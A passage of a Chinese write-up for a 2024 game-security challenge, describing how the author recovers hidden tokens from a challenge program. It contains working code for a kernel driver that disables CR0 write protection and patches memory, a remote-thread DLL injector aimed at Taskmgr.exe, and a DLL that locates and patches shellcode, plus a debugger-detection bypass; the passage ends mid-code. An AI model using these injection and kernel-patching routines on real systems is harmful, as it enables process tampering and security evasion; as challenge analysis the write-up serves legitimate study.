/></p><p>很幸运地只能找到一个，多次实验之后发现它shellcode是不会变的（至少头几个字节），那么就可以匹配特征码去判断 shellcode 的地址。</p><p>并且可以手动计算一下 shellcode StartAddress 和 对应要修改的指令的偏移。</p><p>启动地址：<code style="font-family: SFMono-Regular, Consolas, ;">0xFFFFBB0EDB013DB0</code></p><p>修改地址1：<code style="font-family: SFMono-Regular, Consolas, ;">0xffffbb0edb013e01</code></p><p>修改地址2：<code style="font-family: SFMono-Regular, Consolas, ;">0xffffbb0edb013e64</code></p><p>修改地址3：<code style="font-family: SFMono-Regular, Consolas, ;">0xffffbb0edb013ed4</code></p><p>分别是 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode+0x51+1</code>，<code style="font-family: SFMono-Regular, Consolas, ;">shellcode+0xb4+1</code>，<code style="font-family: SFMono-Regular, Consolas, ;">shellcode+0x124+1</code> 的位置。（+1是因为要改的操作数在指令的偏移处）</p><p>先编写一个遍历内核线程的程序，然后去特判它的特征码，来确定shellcode位置，最后再写入三个指令即可。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntifs.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntdef.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntstatus.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntddk.h&gt;</span></span><br /><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span><br />NTSTATUS <span style="color: rgb(255, 255, 182);">DriverEntry</span>(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);<br />VOID <span style="color: rgb(255, 255, 182);">UnloadDriver</span>(PDRIVER_OBJECT DriverObject);<br />NTSTATUS <span style="color: rgb(255, 255, 182);">EnumerateKernelThreads</span>();<br /><br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">NTSTATUS</span> (*ZWQUERYSYSTEMINFORMATION)(ULONG, PVOID, ULONG, PULONG);<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_SYSTEM_PROCESS_INFORMATION</span> {<br />    ULONG NextEntryOffset;<br />    ULONG NumberOfThreads;<br />    LARGE_INTEGER Reserved[<span style="color: rgb(255, 115, 253);">3</span>];<br />    LARGE_INTEGER CreateTime;<br />    LARGE_INTEGER UserTime;<br />    LARGE_INTEGER KernelTime;<br />    UNICODE_STRING ImageName;<br />    ULONG BasePriority;<br />    HANDLE ProcessId;<br />    HANDLE InheritedFromProcessId;<br />} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_SYSTEM_THREAD_INFORMATION</span> {<br />    LARGE_INTEGER KernelTime;<br />    LARGE_INTEGER UserTime;<br />    LARGE_INTEGER CreateTime;<br />    ULONG WaitTime;<br />    PVOID StartAddress;<br />    CLIENT_ID ClientId;<br />    ULONG Priority;<br />    LONG BasePriority;<br />    ULONG ContextSwitchCount;<br />    LONG State;<br />    LONG WaitReason;<br />} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">enum</span> <span style="color: rgb(255, 255, 182);">_SYSTEM_INFORMATION_CLASS</span> {<br />    SystemProcessInformation = <span style="color: rgb(255, 115, 253);">5</span><br />} SYSTEM_INFORMATION_CLASS;<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> SystemModuleInformation 11</span><br /><br />NTSTATUS <span style="color: rgb(255, 255, 182);">DriverEntry</span>(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {<br />    UNREFERENCED_PARAMETER(RegistryPath);<br />    DriverObject-&gt;DriverUnload = UnloadDriver;<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Driver Loaded\n"</span>));<br />    <span style="color: rgb(150, 203, 254);">return</span> EnumerateKernelThreads();<br />}<br /><br />VOID <span style="color: rgb(255, 255, 182);">UnloadDriver</span>(PDRIVER_OBJECT DriverObject) {<br />    UNREFERENCED_PARAMETER(DriverObject);<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Driver Unloaded\n"</span>));<br />}<br /><br /><span style="color: rgb(255, 255, 182);">char</span> CODE[]={<br />    <span style="color: rgb(255, 115, 253);">0x48</span> ,<span style="color: rgb(255, 115, 253);">0x8B</span> ,<span style="color: rgb(255, 115, 253);">0xC4</span> ,<span style="color: rgb(255, 115, 253);">0x48</span> ,<span style="color: rgb(255, 115, 253);">0x89</span> ,<span style="color: rgb(255, 115, 253);">0x58</span> ,<span style="color: rgb(255, 115, 253);">0x08</span> ,<span style="color: rgb(255, 115, 253);">0x48</span> ,<span style="color: rgb(255, 115, 253);">0x89</span> ,<span style="color: rgb(255, 115, 253);">0x78</span> ,<span style="color: rgb(255, 115, 253);">0x18</span> ,<span style="color: rgb(255, 115, 253);">0x4C</span> ,<span style="color: rgb(255, 115, 253);">0x89</span> ,<span style="color: rgb(255, 115, 253);">0x70</span> ,<span style="color: rgb(255, 115, 253);">0x20</span> ,<span style="color: rgb(255, 115, 253);">0x55</span>,<br />    <span style="color: rgb(146, 255, 184);">//0x48 ,0x8D ,0x68 ,0xA1 ,0x48 ,0x81 ,0xEC ,0xA0 ,0x00 ,0x00 ,0x00 ,0x48 ,0xBF ,0x4E ,0x93 ,0x32,</span><br />};<br /><br />KIRQL <span style="color: rgb(255, 255, 182);">WPOFFx64</span>()<br />{<br />    KIRQL irql = KeRaiseIrqlToDpcLevel();<br />    UINT64 cr0 = __readcr0();<br />    cr0 &amp;= <span style="color: rgb(255, 115, 253);">0xfffffffffffeffff</span>;<br />    __writecr0(cr0);<br />    _disable();<br />    <span style="color: rgb(150, 203, 254);">return</span> irql;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">WPONx64</span>(KIRQL irql)<br />{<br />    UINT64 cr0 = __readcr0();<br />    cr0 |= <span style="color: rgb(255, 115, 253);">0x10000</span>;<br />    _enable();<br />    __writecr0(cr0);<br />    KeLowerIrql(irql);<br />}<br /><br />MDLWriteMemory(PVOID pBaseAddress, PVOID pWriteData, SIZE_T writeDataSize)<br />{<br />    PMDL pMdl = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />    PVOID pNewAddress = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />    pMdl = MmCreateMdl(<span style="color: rgb(198, 197, 254);">NULL</span>, pBaseAddress, writeDataSize);<br />    <span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(198, 197, 254);">NULL</span> == pMdl)<br />    {<br />        <span style="color: rgb(150, 203, 254);">return</span> FALSE;<br />    }<br />    MmBuildMdlForNonPagedPool(pMdl);<br />    pNewAddress = MmMapLockedPages(pMdl, KernelMode);<br />    <span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(198, 197, 254);">NULL</span> == pNewAddress)<br />    {<br />        IoFreeMdl(pMdl);<br />    }<br />    RtlCopyMemory(pNewAddress, pWriteData, writeDataSize);<br />    MmUnmapLockedPages(pNewAddress, pMdl);<br />    IoFreeMdl(pMdl);<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;<br />}<br /><br />NTSTATUS <span style="color: rgb(255, 255, 182);">EnumerateKernelThreads</span>() {<br />    UNICODE_STRING routineName;<br />    RtlInitUnicodeString(&amp;routineName, <span style="color: rgb(168, 255, 96);">L"ZwQuerySystemInformation"</span>);<br />    ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)MmGetSystemRoutineAddress(&amp;routineName);<br />    <span style="color: rgb(150, 203, 254);">if</span> (!ZwQuerySystemInformation) {<br />        <span style="color: rgb(150, 203, 254);">return</span> STATUS_UNSUCCESSFUL;<br />    }<br />    ULONG returnLength = <span style="color: rgb(255, 115, 253);">0</span>;<br />    ZwQuerySystemInformation(SystemProcessInformation, <span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(255, 115, 253);">0</span>, &amp;returnLength);<br />    PVOID buffer = ExAllocatePool(NonPagedPool, returnLength);<br />    <span style="color: rgb(150, 203, 254);">if</span> (!buffer) {<br />        <span style="color: rgb(150, 203, 254);">return</span> STATUS_INSUFFICIENT_RESOURCES;<br />    }<br />    NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, buffer, returnLength, &amp;returnLength);<br />    <span style="color: rgb(150, 203, 254);">if</span> (!NT_SUCCESS(status)) {<br />        ExFreePool(buffer);<br />        <span style="color: rgb(150, 203, 254);">return</span> status;<br />    }<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> k = <span style="color: rgb(255, 115, 253);">0</span>; k &lt; <span style="color: rgb(255, 115, 253);">1</span>; k++) {<br />        PSYSTEM_PROCESS_INFORMATION current = (PSYSTEM_PROCESS_INFORMATION)buffer;<br />        <span style="color: rgb(150, 203, 254);">while</span> (TRUE) {<br />            PSYSTEM_THREAD_INFORMATION threadInfo = (PSYSTEM_THREAD_INFORMATION)(current + <span style="color: rgb(255, 115, 253);">1</span>);<br />            <span style="color: rgb(150, 203, 254);">for</span> (ULONG i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; current-&gt;NumberOfThreads; i++) {<br /><br />                <span style="color: rgb(150, 203, 254);">if</span> (((UINT64)(threadInfo-&gt;StartAddress) &amp; <span style="color: rgb(255, 115, 253);">0xFFFFBB0000000000</span>) == <span style="color: rgb(255, 115, 253);">0xFFFFBB0000000000</span>) {<br />                    kprintf((<span style="color: rgb(168, 255, 96);">"StartAddress %p\n"</span>), threadInfo-&gt;StartAddress);<br /><br />                    <span style="color: rgb(150, 203, 254);">if</span> (MmIsAddressValid(threadInfo-&gt;StartAddress) &amp;&amp; RtlEqualMemory(threadInfo-&gt;StartAddress, CODE, sizeof(CODE))) {<br />                        kprintf((<span style="color: rgb(168, 255, 96);">"Shellcode Found in %p\n"</span>), threadInfo-&gt;StartAddress);<br />                        <span style="color: rgb(255, 255, 182);">char</span>* shellcode = threadInfo-&gt;StartAddress;<br />                        MDLWriteMemory(shellcode + <span style="color: rgb(255, 115, 253);">0x51</span> + <span style="color: rgb(255, 115, 253);">1</span>, <span style="color: rgb(168, 255, 96);">"\x00"</span>, <span style="color: rgb(255, 115, 253);">1</span>);<br />                        MDLWriteMemory(shellcode + <span style="color: rgb(255, 115, 253);">0xb4</span> + <span style="color: rgb(255, 115, 253);">1</span>, <span style="color: rgb(168, 255, 96);">"\x00"</span>, <span style="color: rgb(255, 115, 253);">1</span>);<br />                        MDLWriteMemory(shellcode + <span style="color: rgb(255, 115, 253);">0x124</span> + <span style="color: rgb(255, 115, 253);">1</span>, <span style="color: rgb(168, 255, 96);">"\x00"</span>, <span style="color: rgb(255, 115, 253);">1</span>);<br />                    }<br />                }<br />                threadInfo++;<br />            }<br /><br />            <span style="color: rgb(150, 203, 254);">if</span> (current-&gt;NextEntryOffset == <span style="color: rgb(255, 115, 253);">0</span>)<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br /><br />            current = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)current + current-&gt;NextEntryOffset);<br />        }<br />    }<br /><br />    ExFreePool(buffer);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;<br />}<br /></code></pre><blockquote><p style="margin-bottom: 15px;">该文件编译产物为 XSafe2.sys，运行题目之后加载这个驱动可以让 token2 输出。</p></blockquote><p>通过下图可以看到，驱动加载后搜索到了 shellcode 的地址，并通过修改内存让 token成功输出了，但是自己做的时候发现是有概率的，有时候可能搜不到这个线程，从截图可以看出反复加载了4次才成功找到 shellcode，但是注入成功之后也成功输出了 token2。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=b3ba343a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib34uIHgf8MEtlXqTgIY7zLn45XVTuof6YgIIpvN6fu3oHOcbK7XibqeicQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>token1 的话可以采用新建 <code style="font-family: SFMono-Regular, Consolas, ;">C:\2024GameSafeRace.token1</code> 文件的方式让它将 token1 打印出来，究其原因没有成功输出出来是因为创建文件的时候没有让它在文件不存在时创建。</p><p>后面发现写文件的进程好像是 TaskMgr，并且 token1 是可以独立运行的，所以可以把虚拟机的测试模式关了，后面只需要分析这个三环程序即可。</p><p>用调试器附加，虽然外挂程序检测了调试器，但是通过改名可以绕过，断在创建文件的API上 <code style="font-family: SFMono-Regular, Consolas, ;">CreateFileA</code></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=c554bb10&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3koIfzNta85Dm6ptAnsiacJ9Pt1lxicBFMj8iarYJgjz3licBPttAiaXVfyg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>栈回溯一下发现创建是失败的（返回-1）。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=02ea325f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3gianLExlR5ibibOVnVv7SfIfElb9vrLzgDuG3YOjEfKjKclTMKzibnoz1g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>要让它成功输出让它创建成功即可，同时观察栈我注意到了有个参数3，而参数通过查阅 CreateFileA 的参数说明可知</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> CREATE_NEW          1</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> CREATE_ALWAYS       2</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> OPEN_EXISTING       3</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> OPEN_ALWAYS         4</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> TRUNCATE_EXISTING   5</span></code></pre><p>这也就解释了为什么创建一个文件能够成功写入，尝试把它修改成 1。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=a11c4b4a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3sNwM1ickEaiawHMGQJB7QJYnhCRZBrVje24ibmgOYLsErrNhET1pPdYGw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>发现成功返回了，所以目的非常明确了，让它传的第五个参数改成1即可成功输出到文件中，而刚好注意到上面的一条指令有直接 mov xxx,3 的，把它改成1试试。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=4333e592&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3DXwfYiawhtYxB0n3xQsOYnHsmurIT33gCEWO6yMwMyg0gfe2p0TxzSw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>文件即使不存在也会创建并输出成功。</p><p>那么这里说一个可行的思路：同样注入一个 dll 给它，然后去遍历线程找到 shellcode 入口，计算偏移改掉这个指令，让 token3 成功输出。</p><p>先手动操作一遍：</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=eabcc8c2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3cJuqGDNpYcDXkoAqpzw6TLBUGXicqhkskgTiaLVWicPRaVEGkDoAdazyw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>此时可以发现线程入口是 0000019B070AAB48，要修改的指令地址为 0000019B070A4D6D</p><p>在 StartRoutine - 0x5ddb 的位置上，而且它的地址很明显，只要在堆上就符合条件，但是为了保险还是取一定长度的特征码去比较。</p><p>那么据此写一个针对 Taskmgr 的注入器（二进制文件为 Xinject.exe）：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;windows.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;iostream&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;time.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;stdlib.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;TlHelp32.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> EXEFILEW <span style="color: rgb(168, 255, 96);">L"Taskmgr.exe"</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> EXEFILE <span style="color: rgb(168, 255, 96);">"Taskmgr.exe"</span></span><br />DWORD old;<br />SIZE_T written;<br />DWORD <span style="color: rgb(255, 255, 182);">FindProcess</span>() {<br />    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color: rgb(255, 115, 253);">0</span>);<br />    PROCESSENTRY32 pe32;<br />    pe32 = { sizeof(pe32) };<br />    BOOL ret = Process32First(hSnap, &amp;pe32);<br />    <span style="color: rgb(150, 203, 254);">while</span> (ret)<br />    {<br />        <span style="color: rgb(150, 203, 254);">if</span> (!wcsncmp(pe32.szExeFile,  EXEFILEW, lstrlen(EXEFILEW))) {<br />            printf(<span style="color: rgb(168, 255, 96);">"找到程序 %s ,PID=%d\n"</span>, EXEFILE, pe32.th32ProcessID);<br />            <span style="color: rgb(150, 203, 254);">return</span> pe32.th32ProcessID;<br />        }<br />        ret = Process32Next(hSnap, &amp;pe32);<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">InjectModule</span>(DWORD ProcessId, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span>* szPath)<br />{<br />    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);<br />    printf(<span style="color: rgb(168, 255, 96);">"进程句柄:%p\n"</span>, hProcess);<br />    LPVOID lpAddress = VirtualAllocEx(hProcess, <span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(255, 115, 253);">0x100</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br />    SIZE_T dwWriteLength = <span style="color: rgb(255, 115, 253);">0</span>;<br />    WriteProcessMemory(hProcess, lpAddress, szPath, strlen(szPath), &amp;dwWriteLength);<br />    HANDLE hThread = CreateRemoteThread(hProcess, <span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(198, 197, 254);">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddress, <span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(198, 197, 254);">NULL</span>);<br />    WaitForSingleObject(hThread, <span style="color: rgb(255, 115, 253);">-1</span>);<br />    VirtualFreeEx(hProcess, lpAddress, <span style="color: rgb(255, 115, 253);">0</span>, MEM_RELEASE);<br />    CloseHandle(hProcess);<br />    CloseHandle(hThread);<br />}<br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>() {<br />    DWORD ProcessId = FindProcess();<br />    <span style="color: rgb(150, 203, 254);">while</span> (!ProcessId) {<br />        printf(<span style="color: rgb(168, 255, 96);">"未找到%s程序，等待两秒中再试\n"</span>,EXEFILE);<br />        Sleep(<span style="color: rgb(255, 115, 253);">2000</span>);<br />        ProcessId = FindProcess();<br />    }<br />    InjectModule(ProcessId, <span style="color: rgb(168, 255, 96);">"Xhack.dll"</span>);<br />}</code></pre><p>然后根据以上分析结果写一个改变这个代码的 DLL（二进制文件为 XHack.dll）：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">"pch.h"</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;Windows.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;TlHelp32.h&gt;</span></span><br /><br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">enum</span> <span style="color: rgb(255, 255, 182);">_THREADINFOCLASS</span>{<br />    ThreadBasicInformation,<br />    ThreadTimes,<br />    ThreadPriority,<br />    ThreadBasePriority,<br />    ThreadAffinityMask,<br />    ThreadImpersonationToken,<br />    ThreadDescriptorTableEntry,<br />    ThreadEnableAlignmentFaultFixup,<br />    ThreadEventPair_Reusable,<br />    ThreadQuerySetWin32StartAddress,<br />    ThreadZeroTlsCell,<br />    ThreadPerformanceCount,<br />    ThreadAmILastThread,<br />    ThreadIdealProcessor,<br />    ThreadPriorityBoost,<br />    ThreadSetTlsArrayAddress,<br />    ThreadIsIoPending,<br />    ThreadHideFromDebugger,<br />    ThreadBreakOnTermination,<br />    MaxThreadInfoClass<br />}THREADINFOCLASS;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_CLIENT_ID</span>{<br />    HANDLE UniqueProcess;<br />    HANDLE UniqueThread;<br />}CLIENT_ID;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_THREAD_BASIC_INFORMATION</span>{<br />    LONG ExitStatus;<br />    PVOID TebBaseAddress;<br />    CLIENT_ID ClientId;<br />    LONG AffinityMask;<br />    LONG Priority;<br />    LONG BasePriority;<br />}THREAD_BASIC_INFORMATION,*PTHREAD_BASIC_INFORMATION;<br /><span style="color: rgb(150, 203, 254);">extern</span> <span style="color: rgb(168, 255, 96);">"C"</span> LONG (__stdcall *ZwQueryInformationThread)(<br />    IN HANDLE ThreadHandle,<br />    IN THREADINFOCLASS ThreadInformationClass,<br />    OUT PVOID ThreadInformation,<br />    IN ULONG ThreadInformationLength,<br />    OUT PULONG ReturnLength OPTIONAL<br />    ) = <span style="color: rgb(198, 197, 254);">NULL</span>;<br /><br />BYTE CODE[] = {<br />    <span style="color: rgb(255, 115, 253);">0x40</span>,<span style="color: rgb(255, 115, 253);">0x53</span>,<span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0x83</span>,<span style="color: rgb(255, 115, 253);">0xEC</span>,<span style="color: rgb(255, 115, 253);">0x20</span>,<span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0x8B</span>,<span style="color: rgb(255, 115, 253);">0xD9</span>,<span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0x85</span>,<span style="color: rgb(255, 115, 253);">0xC9</span><br />};<br />BOOL <span style="color: rgb(255, 255, 182);">hack</span>() {<br /><br />    HANDLE hThreadSnap = INVALID_HANDLE_VALUE; <br />    THREADENTRY32 te32; <br />    DWORD dwOwnerPID = GetCurrentProcessId();<br />    hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, <span style="color: rgb(255, 115, 253);">0</span> ); <br />    <span style="color: rgb(150, 203, 254);">if</span>( hThreadSnap == INVALID_HANDLE_VALUE ) <br />    <span style="color: rgb(150, 203, 254);">return</span>( FALSE ); <br /><br />    te32.dwSize = sizeof(THREADENTRY32 ); <br />    <span style="color: rgb(150, 203, 254);">if</span>( !Thread32First( hThreadSnap, &amp;te32 ) ) <br />    {<br />        CloseHandle( hThreadSnap );     <span style="color: rgb(146, 255, 184);">// Must clean up the snapshot object!</span><br />        <span style="color: rgb(150, 203, 254);">return</span>( FALSE );<br />    }<br />    ULONG64 StartAddress;<br />    DWORD dwReturnLength;<br /><br />    <span style="color: rgb(150, 203, 254);">do</span> <br />    { <br />        <span style="color: rgb(150, 203, 254);">if</span>( te32.th32OwnerProcessID == dwOwnerPID )<br />        {<br /><br />            <span style="color: rgb(150, 203, 254);">if</span> (te32.th32OwnerProcessID) {<br />                HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, te32.th32ThreadID);<br />                <span style="color: rgb(150, 203, 254);">if</span> (hThread != <span style="color: rgb(198, 197, 254);">NULL</span>) {<br /><br />                    HINSTANCE hNTDLL = GetModuleHandle(<span style="color: rgb(168, 255, 96);">L"ntdll"</span>);<br />                    (FARPROC&amp;)ZwQueryInformationThread  = ::GetProcAddress(hNTDLL,<span style="color: rgb(168, 255, 96);">"ZwQueryInformationThread"</span>);<br />                    PVOID startaddr;                                                <span style="color: rgb(146, 255, 184);">// 用来接收线程入口地址</span><br />                                        ZwQueryInformationThread(<br />                                                hThread,                                                        <span style="color: rgb(146, 255, 184);">// 线程句柄</span><br />                                                ThreadQuerySetWin32StartAddress,        <span style="color: rgb(146, 255, 184);">// 线程信息类型，ThreadQuerySetWin32StartAddress ：线程入口地址</span><br />                                                &amp;startaddr,                                                        <span style="color: rgb(146, 255, 184);">// 指向缓冲区的指针</span><br />                                                sizeof(startaddr),                                        <span style="color: rgb(146, 255, 184);">// 缓冲区的大小</span><br />                                                <span style="color: rgb(198, 197, 254);">NULL</span>                                                                <br />                                                );<br /><br />                    <span style="color: rgb(150, 203, 254);">if</span> (!memcmp(startaddr,CODE,sizeof(CODE))) {<br />                        <span style="color: rgb(255, 255, 182);">char</span> msg[<span style="color: rgb(255, 115, 253);">0x50</span>];<br />                        sprintf(msg, <span style="color: rgb(168, 255, 96);">"Found the Shellcode in address:%p"</span>, startaddr);<br />                        MessageBoxA(<span style="color: rgb(198, 197, 254);">NULL</span>, msg, <span style="color: rgb(168, 255, 96);">"Success"</span>, MB_OK);<br />                        sprintf(msg, <span style="color: rgb(168, 255, 96);">"Replace The byte %02x to 0x01 in addr 